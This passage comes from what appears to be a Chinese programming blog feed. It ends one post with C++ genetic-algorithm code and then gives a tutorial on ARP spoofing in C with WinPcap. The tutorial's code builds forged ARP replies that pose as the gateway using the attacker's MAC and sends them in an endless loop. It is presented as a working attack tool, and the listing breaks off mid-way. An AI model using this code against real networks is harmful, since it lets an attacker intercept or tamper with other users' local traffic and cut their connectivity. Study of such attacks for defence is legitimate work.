class="params">(<span class="built_in">string</span>* strarr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> *tmpstrarr = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="built_in">size</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;(<span class="built_in">size</span>/<span class="number">2</span>);i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> index=(<span class="number">2</span>*i);<span class="comment">//当前的下标</span></span><br><span class="line">		<span class="keyword">int</span> pos = randRange(<span class="number">0</span>,strarr[index].length()<span class="number">-1</span>);<span class="comment">//取出遗传的位置</span></span><br><span class="line">		tmpstrarr[index] = strarr[index].substr(<span class="number">0</span>,pos)+strarr[index+<span class="number">1</span>].substr(pos,strarr[index].length()-pos);</span><br><span class="line">		tmpstrarr[index+<span class="number">1</span>] = strarr[index+<span class="number">1</span>].substr(<span class="number">0</span>,pos)+strarr[index].substr(pos,strarr[index+<span class="number">1</span>].length()-pos);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">delete</span>[] strarr;</span><br><span class="line">	<span class="keyword">return</span> tmpstrarr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="built_in">string</span>* <span class="title">variation</span><span class="params">(<span class="built_in">string</span>* strarr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> *tmpstrarr = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="built_in">size</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="built_in">size</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> pos = randRange(<span class="number">0</span>,strarr[i].length()<span class="number">-1</span>);<span class="comment">//取出遗传的位置</span></span><br><span class="line">		<span class="built_in">string</span> tmppos = strarr[i].substr(pos,<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (tmppos == <span class="string">"0"</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			tmpstrarr[i] = strarr[i].substr(<span class="number">0</span>,pos)+<span class="string">"1"</span>+strarr[i].substr(pos+<span class="number">1</span>,strarr[i].length()-pos<span class="number">-1</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			tmpstrarr[i] = strarr[i].substr(<span class="number">0</span>,pos)+<span class="string">"0"</span>+strarr[i].substr(pos+<span class="number">1</span>,strarr[i].length()-pos<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">delete</span>[] strarr;</span><br><span class="line">	<span class="keyword">return</span> tmpstrarr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="built_in">string</span>* <span class="title">choose</span><span class="params">(<span class="built_in">string</span>* strarr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> *tmpstrarr = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="built_in">size</span>];</span><br><span class="line">	<span class="keyword">int</span> *chooseData = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="built_in">size</span>);</span><br><span class="line">	<span class="built_in">memset</span>(chooseData,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="built_in">size</span>);</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//分配</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="built_in">size</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> x1 = BinStr2Dec(strarr[i].substr(<span class="number">0</span>,strarr[i].length()/<span class="number">2</span>));</span><br><span class="line">		<span class="keyword">int</span> x2 = BinStr2Dec(strarr[i].substr(strarr[i].length()/<span class="number">2</span>,strarr[i].length()/<span class="number">2</span>));</span><br><span class="line">		<span class="keyword">int</span> res = f(x1,x2);</span><br><span class="line">		chooseData[i] = res;</span><br><span class="line">		count+=res;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//进行选择</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="built_in">size</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> pos = randRange(<span class="number">1</span>,count);</span><br><span class="line">		<span class="keyword">int</span> tmpCount = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="built_in">size</span>;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			tmpCount+=chooseData[j];</span><br><span class="line">			<span class="keyword">if</span> (pos&lt;=tmpCount)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpstrarr[i] = strarr[j];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">delete</span>[] strarr;</span><br><span class="line">	<span class="keyword">return</span> tmpstrarr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decimalToBinaryLength</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> a=num;a;a=a/<span class="number">2</span>)</span><br><span class="line">		i++;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">decimalToBinary</span><span class="params">(<span class="keyword">int</span> num,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> s=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> a=num;a;a=a/<span class="number">2</span>)</span><br><span class="line">		s=(a%<span class="number">2</span>?<span class="string">'1'</span>:<span class="string">'0'</span>)+s;<span class="comment">//不断进行相除</span></span><br><span class="line">	<span class="keyword">while</span>(s.length()&lt;<span class="built_in">size</span>)</span><br><span class="line">		s=<span class="string">'0'</span>+s;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinStr2Dec</span><span class="params">(<span class="built_in">string</span> bin)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> <span class="built_in">size</span> = bin.length();</span><br><span class="line">	<span class="comment">//将二进制数字转换为十进制</span></span><br><span class="line">	<span class="keyword">int</span> parseBinary = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">size</span>; ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span> (bin.substr(i,<span class="number">1</span>) == <span class="string">"1"</span>) &#123;</span><br><span class="line">			parseBinary += <span class="built_in">pow</span>(<span class="number">2.0</span>, <span class="built_in">size</span> - i - <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> parseBinary;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitRand</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randRange</span><span class="params">(<span class="keyword">int</span> Imin,<span class="keyword">int</span> Imax)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> rand()%(Imax+<span class="number">1</span>-Imin)+Imin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">1</span> == num)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> num*factorial(num<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x1, <span class="keyword">int</span> x2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x1*x1+x2*x2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="img4.png" alt="res"><br>可以看到这次比较幸运，491代就得到了全1的结果。<br>我们当繁衍到上千上万的时候，我们的值会越来越接近111111，我们其实可以观察到，哪个染色体出现的越多，或者连续出现的时候，我们基本上可以断定这就是比较适合这个环境函数的个体变量了。<br><img src="img5.jpg" alt="no"><br>当然我们也有可能上千次也没有得到我们的结果，这个要看运气，生物界也会出现运气问题，比如说长颈鹿脖子长，但是比较倒霉，被食肉动物吃掉的情况，反倒是短脖子活下来了，还有就是染色体交叉互换和变异导致出现畸形个体，也是可能的。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这两个代码是我手写的，所以我不能保证是最优的算法，或者他的普适性，这里只是给大家来借鉴！</p>
]]></content>
      <categories>
        <category>人工智能</category>
      </categories>
      <tags>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title>C++实现ARP欺骗</title>
    <url>/2020/11/10/C-%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97/</url>
    <content><![CDATA[<h1 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ARP欺骗（英语：ARP spoofing），又称ARP毒化（ARP poisoning，网络上多译为ARP病毒）或ARP攻击，是针对以太网地址解析协议（ARP）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网络上特定计算机或所有计算机无法正常连线。</span><br></pre></td></tr></table></figure>

<p>实现的方法：</p>
<ol>
<li>给指定的IP发ARP包</li>
<li>ARP中指定来源IP是网关</li>
<li>然后来源的mac填写成我们自己的，这样子他就把网关认为成我们了</li>
</ol>
<p>前几天老哥给我发了一本python的安全攻防，我翻了一下，看到了一篇用python实现的ARP毒化方法，用的是scapy，实现了简单的双工，下午的时候本来是要写人工智能的算法的，但是因为开了个班会的原因，一下子没兴趣了，舍友出去玩了没人陪我打游戏，我就想用C++实现ARP的毒化，也来扩大自己的类库（自己写了好多C++渗透逆向的类库，有感兴趣的可以和我要）。<br>用的还是比较老的winPcap。</p>
<p>编写前简单的了解一下ARP数据包的格式吧。<br><img src="img1.png" alt="ARP"></p>
<p>首先是以太网的头部：</p>
<ol>
<li>0-6字节是目的的mac地址</li>
<li>6-12字节是源的mac地址</li>
<li>12-14字节是我们的请求类型（1位请求，2位响应）</li>
</ol>
<p>ARP头部：</p>
<ol>
<li>硬件类型 1</li>
<li>协议类型 ARP是0x806</li>
<li>硬件地址长度 6</li>
<li>协议地址长度 4</li>
<li>操作类型 ARP请求是1</li>
<li>下面就是mac和ip了，不再重复</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//14字节以太网首部</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EthernetHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	u_char DestMAC[<span class="number">6</span>];    <span class="comment">//目的MAC地址 6字节</span></span><br><span class="line">	u_char SourMAC[<span class="number">6</span>];   <span class="comment">//源MAC地址 6字节</span></span><br><span class="line">	u_short EthType;         <span class="comment">//上一层协议类型，如0x0800代表上一层是IP协议，0x0806为arp  2字节</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//28字节ARP帧结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArpHeader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> short hdType;   <span class="comment">//硬件类型</span></span><br><span class="line">	<span class="keyword">unsigned</span> short proType;   <span class="comment">//协议类型</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> hdSize;   <span class="comment">//硬件地址长度</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> proSize;   <span class="comment">//协议地址长度</span></span><br><span class="line">	<span class="keyword">unsigned</span> short op;   <span class="comment">//操作类型，ARP请求（1），ARP应答（2），RARP请求（3），RARP应答（4）。</span></span><br><span class="line">	u_char smac[<span class="number">6</span>];   <span class="comment">//源MAC地址</span></span><br><span class="line">	u_char sip[<span class="number">4</span>];   <span class="comment">//源IP地址</span></span><br><span class="line">	u_char dmac[<span class="number">6</span>];   <span class="comment">//目的MAC地址</span></span><br><span class="line">	u_char dip[<span class="number">4</span>];   <span class="comment">//目的IP地址</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>知道了这些，配合上我们的毒化方法就能简单的实现一个ARP的欺骗了。</p>
<p>首先我们需要用户输入四个内容（当然也可以只输入目标的IP，但是那样加大了代码量）</p>
<ol>
<li>目标IP</li>
<li>网关IP</li>
<li>本机MAC</li>
<li>目标MAC</li>
</ol>
<p>用户输入进来之后，我们进行校验输入的格式对不对就可以了。<br>然后我们选择网卡，使用winpcap的<code>pcap_findalldevs</code>就可以获取到网卡的信息了，得到的是一个链表，然后全部打印出来，让用户选择相对应的网卡，然后投掷我们ARP数据包。<br>看一下操作：<br><img src="img2.gif" alt="操作"></p>
<p>整个程序比较麻烦的东西就是解析ip和mac，贴一下我写的吧：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IPSTRUCT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> IP[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prarseIP</span><span class="params">(<span class="keyword">char</span>* IP,IPSTRUCT* st)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *substr= strtok(IP,<span class="string">"."</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;IP[<span class="number">0</span>] = atoi(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"."</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;IP[<span class="number">1</span>] = atoi(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"."</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;IP[<span class="number">2</span>] = atoi(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"."</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;IP[<span class="number">3</span>] = atoi(substr);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hex2int</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ((c &gt;= <span class="string">'A'</span>) &amp;&amp; (c &lt;= <span class="string">'Z'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> c - <span class="string">'A'</span> + <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ((c &gt;= <span class="string">'a'</span>) &amp;&amp; (c &lt;= <span class="string">'z'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> c - <span class="string">'a'</span> + <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ((c &gt;= <span class="string">'0'</span>) &amp;&amp; (c &lt;= <span class="string">'9'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> c - <span class="string">'0'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">HexToLLInt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* hexStr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> data[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(hexStr);</span><br><span class="line">	<span class="keyword">if</span> ((hexStr[len - <span class="number">1</span>] == <span class="string">'0'</span>) &amp;&amp; (hexStr[len - <span class="number">2</span>] == <span class="string">'/'</span>))</span><br><span class="line">		len -= <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;len; i += <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> low = hex2int(hexStr[i+<span class="number">1</span>]); <span class="comment">//低四位</span></span><br><span class="line">		<span class="keyword">int</span> high = hex2int(hexStr[i]);  <span class="comment">//高四位</span></span><br><span class="line">		data[count++] = (high &lt;&lt; <span class="number">4</span>) + low;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;count; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ret = ret &lt;&lt; <span class="number">8</span>;</span><br><span class="line">		ret += data[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MACSTRUCT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> MAC[<span class="number">6</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prarseMAC</span><span class="params">(<span class="keyword">char</span>* IP,MACSTRUCT* st)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *substr= strtok(IP,<span class="string">"-"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;MAC[<span class="number">0</span>] = HexToLLInt(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"-"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;MAC[<span class="number">1</span>] = HexToLLInt(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"-"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;MAC[<span class="number">2</span>] = HexToLLInt(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"-"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;MAC[<span class="number">3</span>] = HexToLLInt(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"-"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;MAC[<span class="number">4</span>] = HexToLLInt(substr);</span><br><span class="line">	substr= strtok(<span class="literal">NULL</span>,<span class="string">"-"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!substr)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	st-&gt;MAC[<span class="number">5</span>] = HexToLLInt(substr);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>封装了几个方法，十六进制的从网上借鉴的，懒得写了…</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pcap_if_t</span> *alldevs;</span><br><span class="line"><span class="keyword">pcap_if_t</span> *d;</span><br><span class="line"><span class="keyword">char</span> errbuf[PCAP_ERRBUF_SIZE+<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* Retrieve the interfaces list */</span></span><br><span class="line"><span class="keyword">if</span> (pcap_findalldevs(&amp;alldevs, errbuf) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Error in pcap_findalldevs: %s\n"</span>,errbuf);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* Scan the list printing every entry */</span></span><br><span class="line"><span class="keyword">for</span>(d=alldevs;d;d=d-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line">	printf_s(<span class="string">"%d:"</span>,id);</span><br><span class="line">	id++;</span><br><span class="line">	ifprint(d);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> UseEID = <span class="number">0</span>;</span><br><span class="line">printf_s(<span class="string">"请输入要使用的设备编号:"</span>);</span><br><span class="line">scanf_s(<span class="string">"%d"</span>,&amp;UseEID);</span><br><span class="line"><span class="comment">/* 跳转到选中的适配器 */</span></span><br><span class="line"><span class="keyword">for</span> (d = alldevs, id = <span class="number">0</span>; id &lt; UseEID; d = d-&gt;next, id++)</span><br><span class="line">	Sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">pcap_t</span> *adhandle;   <span class="comment">//打开网络适配器，捕捉实例,是pcap_open返回的对象</span></span><br><span class="line"><span class="keyword">char</span> error[PCAP_ERRBUF_SIZE];</span><br><span class="line"><span class="keyword">if</span>((adhandle = pcap_open_live(d-&gt;name, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1000</span>, error) ) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"\nError opening adapter: %s\n"</span>, error);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>pcap_findalldevs</code>获得<code>pcap_if_t</code>的链表指针，然后打印出来相关信息。<br>封装我们的ARP数据包：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sendbuf[<span class="number">42</span>]; <span class="comment">//arp包结构大小，42个字节</span></span><br><span class="line"></span><br><span class="line">EthernetHeader eh;</span><br><span class="line">ArpHeader ah;</span><br><span class="line"><span class="comment">//赋值MAC地址</span></span><br><span class="line"><span class="built_in">memcpy</span>(eh.DestMAC, ETHDestmac, <span class="number">6</span>);   <span class="comment">//以太网首部目的MAC地址，全为广播地址</span></span><br><span class="line"><span class="built_in">memcpy</span>(eh.SourMAC, ETHSourcemac, <span class="number">6</span>);   <span class="comment">//以太网首部源MAC地址</span></span><br><span class="line">eh.EthType = htons(ETH_ARP);   <span class="comment">//htons：将主机的无符号短整形数转换成网络字节顺序</span></span><br><span class="line"></span><br><span class="line">ah.hdType = htons(ARP_HARDWARE);</span><br><span class="line">ah.proType = htons(ETH_IP);</span><br><span class="line">ah.hdSize = <span class="number">6</span>;</span><br><span class="line">ah.proSize = <span class="number">4</span>;</span><br><span class="line">ah.op = htons(ARP_RESPONSE);</span><br><span class="line"><span class="built_in">memcpy</span>(ah.smac, ARPSourcemac, <span class="number">6</span>);   <span class="comment">//ARP字段源MAC地址</span></span><br><span class="line"><span class="built_in">memcpy</span>(ah.dmac, ARPDestmac, <span class="number">6</span>);   <span class="comment">//ARP字段目的MAC地址</span></span><br><span class="line"><span class="built_in">memcpy</span>(ah.sip, ARPSip, <span class="number">4</span>);   <span class="comment">//ARP字段源IP地址</span></span><br><span class="line"><span class="built_in">memcpy</span>(ah.dip, ARPDip, <span class="number">4</span>);   <span class="comment">//ARP字段目的IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造一个ARP请求</span></span><br><span class="line"><span class="built_in">memset</span>(sendbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(sendbuf));   <span class="comment">//ARP清零</span></span><br><span class="line"><span class="built_in">memcpy</span>(sendbuf, &amp;eh, <span class="keyword">sizeof</span>(eh));</span><br><span class="line"><span class="built_in">memcpy</span>(sendbuf + <span class="keyword">sizeof</span>(eh), &amp;ah, <span class="keyword">sizeof</span>(ah));</span><br></pre></td></tr></table></figure>
<p>循环发送ARP数据包：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">printf_s(<span class="string">"开始ARP欺骗"</span>);</span><br><span class="line"><span class="comment">//监控数据包</span></span><br><span class="line"><span class="comment">//pcap_loop(adhandle, 0, packet_handler, NULL);</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (pcap_sendpacket(adhandle, sendbuf, <span class="number">42</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"ARP欺骗succeed\n"</span>);</span><br><span class="line">		Sleep(<span class="number">500</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"PacketSendPacket in getmine Error: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就可以实现ARP欺骗了。<br>完整代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"PCAP.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"remote-ext.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> WIN32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"wpcap.lib"</span>)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	system("cls");</span></span><br><span class="line"><span class="comment">	static int packet_Count=1;</span></span><br><span class="line"><span class="comment">	packet_Count++;</span></span><br><span class="line"><span class="comment">	printf("开始欺骗后劫持本地的数据包个数:%d",packet_Count);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_ARP         0x0806  <span 